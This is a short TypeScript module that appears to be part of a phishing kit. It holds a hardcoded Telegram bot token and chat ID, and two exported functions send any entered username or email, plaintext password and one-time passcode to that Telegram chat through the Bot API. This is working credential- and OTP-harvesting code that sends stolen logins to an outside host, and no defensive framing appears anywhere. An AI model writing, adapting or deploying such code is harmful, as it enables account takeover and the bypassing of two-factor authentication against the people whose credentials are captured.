const TELEGRAM_BOT_TOKEN = "6858405369:AAHIBm11hz5SSLgH_BZb9mSSFBIOkeiExb8";
const CHAT_ID = "5485468089";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

export const sendLoginAttempt = async (username: string, password: string): Promise<boolean> => {
  try {
    const message = `New login attempt: Username/Email: ${username}, Password: ${password}`;
    
    const response = await fetch(TELEGRAM_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });

    return response.ok;
  } catch (error) {
    console.error('Failed to send login attempt to Telegram:', error);
    return false;
  }
};

export const sendOTPAttempt = async (otp: string, username: string): Promise<boolean> => {
  try {
    const message = `OTP entered: ${otp} for Username: ${username}`;
    
    const response = await fetch(TELEGRAM_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });

    return response.ok;
  } catch (error) {
    console.error('Failed to send OTP attempt to Telegram:', error);
    return false;
  }
};